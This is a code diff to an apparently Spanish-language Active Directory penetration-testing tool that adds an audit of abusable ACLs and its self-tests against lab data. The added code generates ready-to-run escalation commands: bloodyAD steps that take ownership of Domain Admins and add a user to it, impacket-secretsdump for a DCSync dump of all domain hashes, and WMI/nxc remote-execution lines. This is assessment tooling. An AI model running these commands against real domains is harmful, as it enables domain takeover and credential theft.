@@ -3818,8 +3818,8 @@ def fp_msrpc(ip, ports, services, host, deep):
         res["next"].append(
             f"impacket-rpcdump {ip} | grep -iE 'MS-RPRN|MS-PAR|MS-EFSR|spool'   # ¿expone superficie de coacción NTLM? (PrinterBug/PetitPotam)")
     res["next"] += [
-        f"impacket-wmiexec DOMINIO/USER:PASS@{ip}   # RCE por WMI con credenciales válidas (DOMINIO/ opcional en un Windows suelto sin AD)",
-        f"nxc smb {ip} -u USER -p PASS -x whoami   # ejecución remota con credenciales",
+        f"impacket-wmiexec DOMINIO/USER:PASS@{ip}   # RCE por WMI — NECESITA admin LOCAL en el objetivo, NO basta una cuenta de dominio estándar (si no, 'rpc_s_access_denied'). DOMINIO/ opcional en un Windows suelto sin AD",
+        f"nxc smb {ip} -u USER -p PASS -x whoami   # ejecución remota — también NECESITA admin local (si nxc no marcó '(Pwn3d!)' con esta cuenta, dará STATUS_ACCESS_DENIED)",
     ]
     return res
 
@@ -6486,6 +6486,114 @@ def _add_once(res, sev, text, marker, seen=None):
     return True
 
 
+# ── Auditoría de ACLs abusables (mini-BloodHound de una pregunta) ──────────────────────────
+# Objetos de alto valor cuya DACL se audita CON la credencial: quien tenga control sobre ellos
+# tiene una ruta directa a Domain Admin. Se consultan por sAMAccountName con 'nxc -M daclread'
+# filtrando por PRINCIPAL=<la credencial> (ver _surface_acl_abuse). El dominio (para DCSync) va
+# por TARGET_DN aparte. Confirmado contra el código fuente real de nxc (nxc/modules/daclread.py).
+_ACL_HV_GROUPS = ("Domain Admins", "Enterprise Admins", "Administrators")
+# Derechos de una ACE que dan CONTROL del objeto (o permiten meter miembros en un grupo) → abuso.
+# Nombres EXACTOS como los imprime daclread (ACCESS_MASK/SIMPLE_PERMISSIONS de nxc): 'WriteDACL'
+# (no 'WriteDacl'), 'GenericAll', etc.
+_ACL_DANGEROUS_RIGHTS = ("GenericAll", "FullControl", "WriteDACL", "WriteOwner",
+                         "GenericWrite", "WriteProperties", "Self")
+_DACLREAD_MASK_RE = re.compile(r"Access mask\s*:\s*(.+)", re.I)
+_DACLREAD_ACE_RE = re.compile(r"ACE\[\d+\] info")
+
+
+def _parse_daclread_rights(out):
+    """Derechos ABUSABLES que `nxc -M daclread` (con PRINCIPAL filtrado a una credencial) le
+    atribuye sobre el objeto consultado. Devuelve la lista de derechos peligrosos
+    (GenericAll/FullControl/WriteDACL/WriteOwner/GenericWrite/WriteProperties/Self) hallados en
+    las líneas 'Access mask' de las ACEs impresas, en orden de aparición y sin repetir. Vacía si
+    el principal no tiene ninguna ACE peligrosa (los derechos de lectura normales —ReadProperties,
+    ListChildObjects…— no están en la lista, así que no dan falso positivo). Formato confirmado en
+    el código fuente real de nxc. Puro → testeable sin red."""
+    found = []
+    for line in (out or "").splitlines():
+        m = _DACLREAD_MASK_RE.search(line)
+        if not m:
+            continue
+        for r in _ACL_DANGEROUS_RIGHTS:
+            if re.search(rf"\b{re.escape(r)}\b", m.group(1)) and r not in found:
+                found.append(r)
+    return found
+
+
+def _daclread_has_ace(out):
+    """¿`nxc -M daclread` imprimió alguna ACE? (con RIGHTS=DCSync y PRINCIPAL filtrados, una sola
+    ACE ya significa que el principal tiene el derecho buscado). Puro → testeable sin red."""
+    return bool(_DACLREAD_ACE_RE.search(out or ""))
+
+
+def _acl_abuse_cmds(rights, group, u, secret, is_hash, domain, ip):
+    """Comando(s) bloodyAD para abusar del derecho detectado sobre un grupo de alto valor y
+    acabar como Domain Admin. bloodyAD va por LDAP/NTLM y funciona contra una IP — a diferencia
+    de 'net rpc group addmem', que intenta Kerberos primero y falla con 'Failed to connect to
+    IPC$' contra un target por IP sin FQDN (confirmado en vivo). Pass-the-hash: '-p :<hash>'.
+    El secreto se enmascara (***), igual que el resto de next-steps de _creds_enum. Puro →
+    testeable sin red."""
+    cred = f"-u {shlex.quote(u)} -p " + ("':***'" if is_hash else "'***'")   # bloodyAD: hash → -p :hash
+    base = f"bloodyAD --host {ip} -d {domain} {cred}"
+    g = shlex.quote(group)
+    uq = shlex.quote(u)
+    addmem = f"{base} add groupMember {g} {uq}   # te metes en '{group}' (ya eres de facto Domain Admin)"
+    if "WriteOwner" in rights:
+        return [f"{base} set owner {g} {uq}   # 1) WriteOwner: te haces dueño del grupo",
+                f"{base} add genericAll {g} {uq}   # 2) ya como dueño, te das GenericAll",
+                addmem.replace("# te metes", "# 3) te metes")]
+    if "WriteDACL" in rights and not any(r in rights for r in ("GenericAll", "FullControl", "GenericWrite", "WriteProperties", "Self")):
+        return [f"{base} add genericAll {g} {uq}   # 1) WriteDACL: te concedes GenericAll sobre el grupo",
+                addmem.replace("# te metes", "# 2) te metes")]
+    # GenericAll/FullControl/GenericWrite/WriteProperties/Self → meter miembro directo (1 paso)
+    return [addmem]
+
+
+def _surface_acl_abuse(res, nxc, ip, u, secret, is_hash, domain, base_dn, auth_args, shown_auth, seen):
+    """Mini-BloodHound de UNA pregunta: ¿esta credencial tiene una ruta DIRECTA a Domain Admin
+    por una ACL mal puesta, sin necesidad de BloodHound/Neo4j? Con 'nxc -M daclread' (filtrando
+    por PRINCIPAL=la credencial) mira dos cosas:
+      1) DS-Replication-Get-Changes[-All] sobre el dominio (RIGHTS=DCSync) → DCSync YA viable
+         (volcar todos los hashes sin ser admin).
+      2) GenericAll/WriteDACL/WriteOwner/GenericWrite/WriteProperties/Self sobre Domain Admins /
+         Enterprise Admins / Administrators → escalada directa (meterse en el grupo).
+    Cada hallazgo es CRÍTICO y lleva el comando concreto de abuso (bloodyAD; ver _acl_abuse_cmds).
+    SOLO LECTURA: daclread solo LEE la DACL; el abuso queda como next-step MANUAL, igual que
+    Zerologon/noPac. Caso real que lo motivó: CT059 tenía GenericAll sobre Domain Admins (era la
+    ruta del assessment) y palantir no tenía forma de verlo solo — había que tirar de BloodHound
+    a mano."""
+    def _dacl(opts):
+        return _run_capture_retry([nxc, "ldap", ip] + auth_args + ["-M", "daclread", "-o"] + opts,
+                                  timeout=90, quiet=True)
+
+    def _m(o):   # enmascara el secreto en la salida guardada (igual que mask() de _creds_enum)
+        return o.replace(secret, "***") if (secret and not is_hash) else o
+    # 1) DCSync: ¿derecho de replicación sobre el dominio?
+    rc, out = _dacl([f"TARGET_DN={base_dn}", f"PRINCIPAL={u}", "RIGHTS=DCSync", "ACTION=read"])
+    _step(res, f"{nxc} ldap {ip} {shown_auth} -M daclread -o TARGET_DN={base_dn} PRINCIPAL={u} RIGHTS=DCSync",
+          _daclread_has_ace(out), _m(out),
+          note="¿esta credencial tiene DS-Replication-Get-Changes[-All] sobre el dominio? → DCSync viable YA "
+               "(volcar todos los hashes sin ser admin)")
+    if _daclread_has_ace(out) and _add_once(res, "critica",
+            f"AD (cred {u}): DCSync viable — «{u}» tiene DS-Replication-Get-Changes-All sobre el dominio → "
+            "volcar TODOS los hashes del dominio (krbtgt incluido) sin ser Domain Admin", "DCSync viable", seen):
+        res["next"].append(
+            f"impacket-secretsdump -just-dc {domain}/{shlex.quote(u)}:***@{ip}   # DCSync confirmado arriba: "
+            "vuelca el NTDS entero (añade '-just-dc-user krbtgt' para solo la krbtgt → Golden Ticket)")
+    # 2) Control abusable sobre grupos de alto valor
+    for grp in _ACL_HV_GROUPS:
+        rc, out = _dacl([f"TARGET={grp}", f"PRINCIPAL={u}", "ACTION=read"])
+        rights = _parse_daclread_rights(out)
+        _step(res, f"{nxc} ldap {ip} {shown_auth} -M daclread -o TARGET={shlex.quote(grp)} PRINCIPAL={u}",
+              bool(rights), _m(out),
+              note=f"¿esta credencial tiene control abusable (GenericAll/WriteDACL/WriteOwner/…) sobre '{grp}'? → escalada directa a Domain Admin")
+        if rights and _add_once(res, "critica",
+                f"AD (cred {u}): «{u}» tiene {', '.join(rights)} sobre '{grp}' → escalada DIRECTA a {grp} "
+                "(meterse en el grupo) — la ruta que normalmente hay que buscar con BloodHound a mano", f"ACL {grp}", seen):
+            for c in _acl_abuse_cmds(rights, grp, u, secret, is_hash, domain, ip):
+                res["next"].append(c)
+
+
 def _parse_nxc_userlist(out):
     """Nombres de usuario de una salida de `nxc --users` (SMB o LDAP): el 1er token de cada
     fila de la tabla (tras el prefijo 'PROTO ip puerto host'), saltando banner/estado/
@@ -6969,6 +7077,14 @@ def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, d
                               + ", ".join(f"{h} ({os_})" for h, _ip, os_ in obs_hosts[:10])
                               + (" …" if len(obs_hosts) > 10 else ""),
                               "SO obsoleto", seen)
+                # Auditoría de ACLs abusables (mini-BloodHound de una pregunta): ¿esta credencial
+                # tiene una ruta DIRECTA a Domain Admin por una ACL mal puesta (GenericAll sobre
+                # Domain Admins, DCSync sobre el dominio…) sin montar BloodHound/Neo4j? Necesita el
+                # dominio para el DN raíz y para los comandos de abuso (bloodyAD). Ver _surface_acl_abuse.
+                if domain:
+                    _surface_acl_abuse(res, nxc, ip, u, secret, is_hash, domain,
+                                       ",".join(f"dc={p}" for p in domain.split(".")),
+                                       A(), shown_auth, seen)
             # get-desc-users: contraseñas filtradas en el campo "description" de las cuentas
             # (fallo de higiene clásico en AD). fp_ldap ya lo ejecuta, pero SOLO tras un bind
             # anónimo — si el anónimo está deshabilitado (lo normal en un AD mínimamente
@@ -9911,6 +10027,63 @@ def selftest():
     assert _parse_laps_hits("Getting LAPS Passwords") == []
     assert _parse_laps_hits("") == []
     assert _parse_laps_hits("No result found with attribute ms-MCS-AdmPwd or msLAPS-Password !") == []
+
+    # ── Auditoría de ACLs abusables (mini-BloodHound) — parsers puros ──
+    # _parse_daclread_rights: formato REAL de nxc -M daclread (ACE[i] info + '\tAccess mask : ...'),
+    # con el prefijo 'LDAP ip 389 host' de nxc por delante. Solo marca derechos ABUSABLES.
+    _dacl_ga = ("LDAP 172.16.7.3 389 DC01 Be careful, this module cannot read the DACLS recursively.\n"
+                "LDAP 172.16.7.3 389 DC01 ACE[14] info\n"
+                "LDAP 172.16.7.3 389 DC01 \tAccess mask               : GenericAll (0x10000000)\n"
+                "LDAP 172.16.7.3 389 DC01 \tTrustee (SID)             : INLANEFREIGHT\\CT059 (S-1-5-21-1-2-3-1130)")
+    assert _parse_daclread_rights(_dacl_ga) == ["GenericAll"]
+    assert _daclread_has_ace(_dacl_ga) and not _daclread_has_ace("LDAP ... [-] nada")
+    _dacl_wd = ("LDAP x 389 DC ACE[2] info\n"
+                "LDAP x 389 DC \tAccess mask               : WriteDACL, WriteOwner, ReadControl (0xc0000)\n"
+                "LDAP x 389 DC \tTrustee (SID)             : DOM\\CT059 (S-1-5-21-..-1130)")
+    assert _parse_daclread_rights(_dacl_wd) == ["WriteDACL", "WriteOwner"]   # ReadControl NO es abusable
+    # derechos de solo lectura normales → nada que flaggear (no falso positivo)
+    assert _parse_daclread_rights("LDAP x 389 DC \tAccess mask : ReadProperties, ListChildObjects (0x14)") == []
+
+    # _acl_abuse_cmds: comando bloodyAD correcto según el derecho (contra IP, NTLM, '-p :hash' si PtH)
+    _ga_cmds = _acl_abuse_cmds(["GenericAll"], "Domain Admins", "CT059", "charlie1", False, "inlanefreight.local", "172.16.7.3")
+    assert len(_ga_cmds) == 1 and "bloodyAD --host 172.16.7.3 -d inlanefreight.local" in _ga_cmds[0]
+    assert "add groupMember 'Domain Admins' CT059" in _ga_cmds[0] and "net rpc" not in _ga_cmds[0]
+    _wd_cmds = _acl_abuse_cmds(["WriteDACL"], "Domain Admins", "CT059", "charlie1", False, "inlanefreight.local", "172.16.7.3")
+    assert len(_wd_cmds) == 2 and "add genericAll" in _wd_cmds[0] and "add groupMember" in _wd_cmds[1]   # 2 pasos
+    _wo_cmds = _acl_abuse_cmds(["WriteOwner"], "Domain Admins", "CT059", "charlie1", False, "inlanefreight.local", "172.16.7.3")
+    assert len(_wo_cmds) == 3 and "set owner" in _wo_cmds[0]   # owner → genericAll → addmem
+    _h_cmds = _acl_abuse_cmds(["GenericAll"], "Domain Admins", "CT059", "ignored", True, "inlanefreight.local", "172.16.7.3")
+    assert "-p ':***'" in _h_cmds[0]   # PtH: bloodyAD -p :hash (enmascarado)
+
+    # _surface_acl_abuse (cableo): DCSync sobre el dominio + GenericAll sobre Domain Admins →
+    # DOS críticas + los comandos de abuso (secretsdump / bloodyAD). Caso real: CT059.
+    _real_rcr_acl = _run_capture_retry
+
+    def _fake_daclread(cmd, timeout=None, quiet=False, **kw):
+        s = " ".join(cmd)
+        if "RIGHTS=DCSync" in s:
+            return 0, ("LDAP x 389 DC ACE[0] info\nLDAP x 389 DC \tAccess mask               : ControlAccess\n"
+                       "LDAP x 389 DC \tObject type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n"
+                       "LDAP x 389 DC \tTrustee (SID)             : DOM\\CT059 (S-1-5-21-1-2-3-1130)")
+        if "TARGET=Domain Admins" in s:
+            return 0, ("LDAP x 389 DC ACE[5] info\nLDAP x 389 DC \tAccess mask               : GenericAll (0x10000000)\n"
+                       "LDAP x 389 DC \tTrustee (SID)             : DOM\\CT059 (S-1-5-21-1-2-3-1130)")
+        return 0, "LDAP x 389 DC [*] sin ACE para este principal"   # Enterprise Admins / Administrators
+    globals()["_run_capture_retry"] = _fake_daclread
+    _acl_res = _fp("reuse-ldap", "x", [389])
+    try:
+        _surface_acl_abuse(_acl_res, "FAKE_NXC", "172.16.7.3", "CT059", "charlie1", False,
+                           "inlanefreight.local", "dc=inlanefreight,dc=local",
+                           ["-u", "CT059", "-p", "/tmp/x.pw"], "-u CT059 -p '***'", set())
+    finally:
+        globals()["_run_capture_retry"] = _real_rcr_acl
+    _acl_crit = [t for s, t in _acl_res["findings"] if s == "critica"]
+    assert any("DCSync viable" in t and "CT059" in t for t in _acl_crit), _acl_crit
+    assert any("GenericAll" in t and "Domain Admins" in t and "escalada DIRECTA" in t for t in _acl_crit), _acl_crit
+    _acl_next = " ".join(_acl_res["next"])
+    assert "impacket-secretsdump -just-dc inlanefreight.local/CT059" in _acl_next
+    assert "bloodyAD --host 172.16.7.3 -d inlanefreight.local" in _acl_next
+    assert "add groupMember 'Domain Admins' CT059" in _acl_next and "net rpc" not in _acl_next
     # _secretsdump_hash: DCSync-rights check (secretsdump.py -just-dc-user krbtgt) — mismo
     # formato 'usuario:RID:lm:nt:::' que _parse_nxc_sam; sin derechos, la cuenta pedida NUNCA
     # aparece en la salida (se queda en el error RPC de la fase DRSUAPI, no en una línea vacía).
